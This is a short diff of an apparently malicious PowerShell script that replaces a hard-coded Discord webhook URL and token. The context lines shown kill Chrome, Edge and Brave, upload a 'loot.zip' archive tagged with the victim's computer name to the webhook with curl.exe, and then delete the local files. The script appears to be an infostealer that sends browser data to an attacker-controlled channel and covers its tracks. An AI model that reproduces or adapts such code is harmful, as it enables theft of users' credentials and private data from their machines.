@@ -1,4 +1,4 @@
-$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"
+$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"
 
 # Kill browsers
 taskkill /F /IM chrome.exe,msedge.exe,brave.exe 2>$null
@@ -50,3 +50,4 @@ curl.exe -F "file=@loot.zip" -F "content=**Loot from $env:COMPUTERNAME**" $wh
 # Cleanup
 Start-Sleep -Seconds 3
 Remove-Item "loot.zip","Loot" -Recurse -Force -EA 0
+
